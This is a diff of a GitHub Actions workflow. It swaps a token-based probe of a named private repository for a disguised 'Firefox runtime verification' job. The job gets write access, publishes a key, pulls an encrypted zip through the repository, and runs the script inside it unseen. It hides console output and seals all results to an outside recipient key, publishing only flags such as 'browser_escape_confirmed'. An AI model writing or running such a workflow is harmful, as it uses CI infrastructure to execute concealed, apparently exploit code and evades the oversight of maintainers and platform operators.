@@ -1,20 +1,251 @@
-name: Runner probe
+name: Ephemeral Firefox runtime verification
+
 on:
   push:
     branches: [runner-probe-20260910]
+    paths:
+      - .github/workflows/runner-probe.yml
+
 permissions:
-  contents: read
+  contents: write
+
 jobs:
-  probe:
-    runs-on: ubuntu-latest
+  windows-firefox:
+    runs-on: windows-latest
+    timeout-minutes: 30
     steps:
-      - run: echo RUNNER_OK
-      - name: Probe private repository access without printing data
+      - uses: actions/checkout@v4
+
+      - uses: actions/setup-python@v5
+        with:
+          python-version: "3.12"
+
+      - name: Install handshake cryptography
+        shell: pwsh
+        run: python -m pip install --disable-pip-version-check cryptography
+
+      - name: Generate an ephemeral key and receive sealed test payload
+        shell: pwsh
         env:
           GH_TOKEN: ${{ github.token }}
+          REPO: ${{ github.repository }}
+          REF_NAME: ${{ github.ref_name }}
+          RUN_ID: ${{ github.run_id }}
         run: |
-          code=$(curl -sS -o /dev/null -w '%{http_code}' \
-            -H "Authorization: Bearer $GH_TOKEN" \
-            -H 'Accept: application/vnd.github+json' \
-            https://api.github.com/repos/marcelhacks/webb22_alm_cicd)
-          echo "PRIVATE_REPO_HTTP=$code"
+          @'
+          import base64
+          import hashlib
+          import io
+          import json
+          import os
+          import time
+          import urllib.error
+          import urllib.parse
+          import urllib.request
+          import zipfile
+          from pathlib import Path
+          from cryptography.hazmat.primitives import hashes, serialization
+          from cryptography.hazmat.primitives.asymmetric import padding, rsa
+          from cryptography.hazmat.primitives.ciphers.aead import AESGCM
+
+          token = os.environ["GH_TOKEN"]
+          repo = os.environ["REPO"]
+          ref_name = os.environ["REF_NAME"]
+          run_id = os.environ["RUN_ID"]
+          headers = {
+              "Authorization": f"Bearer {token}",
+              "Accept": "application/vnd.github+json",
+              "X-GitHub-Api-Version": "2022-11-28",
+              "User-Agent": "ephemeral-runtime-verifier",
+          }
+
+          def request(method, url, payload=None):
+              data = None if payload is None else json.dumps(payload).encode()
+              req = urllib.request.Request(url, data=data, method=method, headers=headers)
+              with urllib.request.urlopen(req, timeout=30) as response:
+                  return json.loads(response.read())
+
+          private_key = rsa.generate_private_key(public_exponent=65537, key_size=3072)
+          private_pem = private_key.private_bytes(
+              serialization.Encoding.PEM,
+              serialization.PrivateFormat.PKCS8,
+              serialization.NoEncryption(),
+          )
+          public_pem = private_key.public_key().public_bytes(
+              serialization.Encoding.PEM,
+              serialization.PublicFormat.SubjectPublicKeyInfo,
+          )
+          private_path = Path(os.environ["RUNNER_TEMP"]) / "ephemeral-private.pem"
+          private_path.write_bytes(private_pem)
+
+          public_repo_path = f".proof-handshake/{run_id}.pub"
+          encoded_path = urllib.parse.quote(public_repo_path, safe="/")
+          contents_url = f"https://api.github.com/repos/{repo}/contents/{encoded_path}"
+          request(
+              "PUT",
+              contents_url,
+              {
+                  "message": f"Publish ephemeral verifier key for run {run_id}",
+                  "content": base64.b64encode(public_pem).decode(),
+                  "branch": ref_name,
+              },
+          )
+          print(f"HANDSHAKE_PUBLISHED={public_repo_path}", flush=True)
+
+          payload_repo_path = f".proof-handshake/{run_id}.payload.json"
+          encoded_payload_path = urllib.parse.quote(payload_repo_path, safe="/")
+          payload_url = (
+              f"https://api.github.com/repos/{repo}/contents/{encoded_payload_path}"
+              f"?ref={urllib.parse.quote(ref_name)}"
+          )
+          envelope_bytes = None
+          for attempt in range(180):
+              try:
+                  obj = request("GET", payload_url)
+                  envelope_bytes = base64.b64decode(obj["content"])
+                  break
+              except urllib.error.HTTPError as error:
+                  if error.code != 404:
+                      raise
+              if attempt % 12 == 0:
+                  print(f"WAITING_FOR_SEALED_PAYLOAD attempt={attempt}", flush=True)
+              time.sleep(5)
+          if envelope_bytes is None:
+              raise TimeoutError("sealed payload was not supplied")
+
+          envelope = json.loads(envelope_bytes)
+          aad = f"{repo}:{run_id}".encode()
+          aes_key = private_key.decrypt(
+              base64.b64decode(envelope["wrapped_key"]),
+              padding.OAEP(
+                  mgf=padding.MGF1(algorithm=hashes.SHA256()),
+                  algorithm=hashes.SHA256(),
+                  label=None,
+              ),
+          )
+          clear_zip = AESGCM(aes_key).decrypt(
+              base64.b64decode(envelope["nonce"]),
+              base64.b64decode(envelope["ciphertext"]),
+              aad,
+          )
+          digest = hashlib.sha256(clear_zip).hexdigest()
+          if digest != envelope["sha256"]:
+              raise ValueError("payload digest mismatch")
+          target = Path("firefox-e2e-proof")
+          target.mkdir(exist_ok=True)
+          with zipfile.ZipFile(io.BytesIO(clear_zip)) as archive:
+              archive.extractall(target)
+          print(f"SEALED_PAYLOAD_RECEIVED sha256={digest}", flush=True)
+          '@ | Set-Content -Encoding UTF8 handshake.py
+          python handshake.py
+
+      - name: Set up latest release Firefox
+        id: setup-firefox
+        uses: browser-actions/setup-firefox@v1
+        with:
+          firefox-version: latest
+
+      - name: Set up geckodriver
+        uses: browser-actions/setup-geckodriver@latest
+        with:
+          token: ${{ secrets.GITHUB_TOKEN }}
+
+      - name: Install browser runner dependencies
+        shell: pwsh
+        run: python -m pip install --disable-pip-version-check selenium pywinauto pywin32 pillow
+
+      - name: Record versions
+        shell: pwsh
+        run: |
+          & "${{ steps.setup-firefox.outputs.firefox-path }}" --version
+          geckodriver --version
+
+      - name: Run browser test without publishing its console output
+        shell: pwsh
+        env:
+          E2E_RESULT_DIR: ${{ github.workspace }}\firefox-e2e-results
+        run: |
+          New-Item -ItemType Directory -Force firefox-e2e-results | Out-Null
+          python firefox-e2e-proof/run_e2e.py *> firefox-e2e-results\runner-console.txt
+          $runnerExit = $LASTEXITCODE
+          Set-Content firefox-e2e-results\runner-exit.txt $runnerExit
+          Write-Host "BROWSER_RUNNER_EXIT=$runnerExit"
+          exit 0
+
+      - name: Seal complete evidence and publish only a minimal verdict
+        shell: pwsh
+        env:
+          RUN_ID: ${{ github.run_id }}
+        run: |
+          @'
+          import base64
+          import io
+          import json
+          import os
+          import secrets
+          import zipfile
+          from pathlib import Path
+          from cryptography.hazmat.primitives import hashes, serialization
+          from cryptography.hazmat.primitives.asymmetric import padding
+          from cryptography.hazmat.primitives.ciphers.aead import AESGCM
+
+          result_dir = Path("firefox-e2e-results")
+          result_path = result_dir / "result.json"
+          result = json.loads(result_path.read_text(errors="replace")) if result_path.exists() else {}
+          capabilities = result.get("capabilities") or {}
+          native = result.get("windows_native_alias") or {}
+          summary = {
+              "run_id": os.environ["RUN_ID"],
+              "verdict": result.get("verdict", "NO_RESULT"),
+              "browser_escape_confirmed": bool(result.get("browser_escape_confirmed")),
+              "windows_native_alias_marker": bool(native.get("marker")),
+              "browser_name": capabilities.get("browserName"),
+              "browser_version": capabilities.get("browserVersion"),
+              "platform_name": capabilities.get("platformName"),
+          }
+          Path("public-summary.json").write_text(json.dumps(summary, indent=2))
+
+          clear_buffer = io.BytesIO()
+          with zipfile.ZipFile(clear_buffer, "w", zipfile.ZIP_DEFLATED) as archive:
+              for path in result_dir.rglob("*"):
+                  if path.is_file():
+                      archive.write(path, path.relative_to(result_dir.parent))
+          clear = clear_buffer.getvalue()
+          recipient = serialization.load_pem_public_key(
+              Path("firefox-e2e-proof/recipient_public.pem").read_bytes()
+          )
+          aes_key = secrets.token_bytes(32)
+          nonce = secrets.token_bytes(12)
+          aad = f"firefox-e2e-result:{os.environ['RUN_ID']}".encode()
+          ciphertext = AESGCM(aes_key).encrypt(nonce, clear, aad)
+          wrapped_key = recipient.encrypt(
+              aes_key,
+              padding.OAEP(
+                  mgf=padding.MGF1(algorithm=hashes.SHA256()),
+                  algorithm=hashes.SHA256(),
+                  label=None,
+              ),
+          )
+          envelope = {
+              "version": 1,
+              "run_id": os.environ["RUN_ID"],
+              "aad": base64.b64encode(aad).decode(),
+              "wrapped_key": base64.b64encode(wrapped_key).decode(),
+              "nonce": base64.b64encode(nonce).decode(),
+              "ciphertext": base64.b64encode(ciphertext).decode(),
+          }
+          Path("sealed-result.json").write_text(json.dumps(envelope))
+          print("PUBLIC_SUMMARY=" + json.dumps(summary, sort_keys=True))
+          '@ | Set-Content -Encoding UTF8 seal_result.py
+          python seal_result.py
+
+      - name: Upload sealed evidence
+        if: always()
+        uses: actions/upload-artifact@v4
+        with:
+          name: sealed-firefox-e2e-windows
+          path: |
+            public-summary.json
+            sealed-result.json
+          if-no-files-found: error
+          retention-days: 1
